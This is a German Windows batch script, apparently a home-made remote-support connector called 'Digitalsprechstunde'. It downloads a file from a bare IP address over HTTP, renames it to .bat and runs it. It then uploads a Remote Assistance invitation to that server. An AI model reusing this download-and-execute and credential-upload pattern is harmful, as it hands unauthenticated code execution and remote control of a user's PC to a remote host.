@echo off
:reload
cls
echo Verbindung zum Netzwerk wird hergestellt...
md "%userprofile%"\Digitalsprechstunde
md %systemdrive%\Digitalsprechstunde
del %systemdrive%\Digitalsprechstunde\*.sys /Q /F
del %systemdrive%\Digitalsprechstunde\*.bat /Q /F
del %systemdrive%\Digitalsprechstunde\*.sys /Q /F
del "%userprofile%"\Digitalsprechstunde\*.msrcincident /Q /F
del "%userprofile%"\Digitalsprechstunde\*.msrcincident /Q /F
del "%userprofile%"\Digitalsprechstunde\* /Q /F
del %systemdrive%\Digitalsprechstunde\* /Q /F
bitsadmin /transfer "Digitalsprechstunde" /PRIORITY HIGH "http://185.245.61.74/online.sys" "%userprofile%"\Digitalsprechstunde\checkifonline.sys
set troublecode=%errorlevel%
if not exist "%userprofile%"\Digitalsprechstunde\checkifonline.sys goto servernotonline
cls
echo Digitalsprechstunde - Verbunden mit Server
echo Geben Sie den Code ein, den sie von ihrem Assistenten Erhalten haben.
set /p codeopt=Code: 
echo Verbindung zum Netzwerk wird hergestellt...
md "%userprofile%"\Digitalsprechstunde
bitsadmin /transfer "Digitalsprechstunde" /PRIORITY HIGH "http://185.245.61.74/Digitalsprechstunde/Session_%codeopt%.sys" "%userprofile%"\Digitalsprechstunde\session.sys
if not exist "%userprofile%"\Digitalsprechstunde\session.sys goto sessionnotfound
rem http://185.245.61.74
goto connectsession

:servernotonline
cls
echo Es konnte keine Verbindung hergestellt werden.
echo Fehlercode: %troublecode%
pause
goto reload

:connectsession
cls
echo Laden...
md %systemdrive%\Digitalsprechstunde
rem for /F "usebackq" %%a in ("%userprofile%"\Digitalsprechstunde\session.sys) do set signkey=%%a
rem for /f "usebackq" %%a in ("%userprofile%"\Digitalsprechstunde\session.sys) do set signkey=%%a
cls
echo Verbindung wird Vorbereitet...
rename "%userprofile%"\Digitalsprechstunde\session.sys session.bat
call "%userprofile%"\Digitalsprechstunde\session.bat
rem start msra /saveasfile "%userprofile%"\Digitalsprechstunde\%codeopt% "%username%"
rem set codeoptbackup=%codeopt%
rem set codeopt=%codeopt% %systemkey%
rem start cmd /k msra /saveasfile "%userprofile%"\Digitalsprechstunde\"%codeopt%"
rem echo %systemkey%>pw.txt
rem set /p pw=<pw.txt
rem  msra /saveasfile  C:\Users\Besitzer\easyhelper %pw%
rem pause
rem start cmd /k "%userprofile%"\Digitalsprechstunde\tester.bat
rem set codeopt=%codeoptbackup%
:stillwait
timeout 3 /NOBREAK
if not exist "%systemdrive%"\Digitalsprechstunde\%codeopt%.msrcincident goto stillwait
cls
echo Hochladen der Datei...
curl  -F fileupload1=@"%systemdrive%"\Digitalsprechstunde\%codeopt%.msrcincident   -F press="Upload files"  http://185.245.61.74/Digitalsprechstunde
echo a>"%userprofile%"\Digitalsprechstunde\uploaddone_%codeopt%.sys
curl  -F fileupload1=@"%userprofile%"\Digitalsprechstunde\uploaddone_%codeopt%.sys   -F press="Upload files"  http://185.245.61.74/Digitalsprechstunde
echo Fertig!
pause
exit

:sessionnotfound
cls
echo Der Code ist Falsch!
pause
goto reload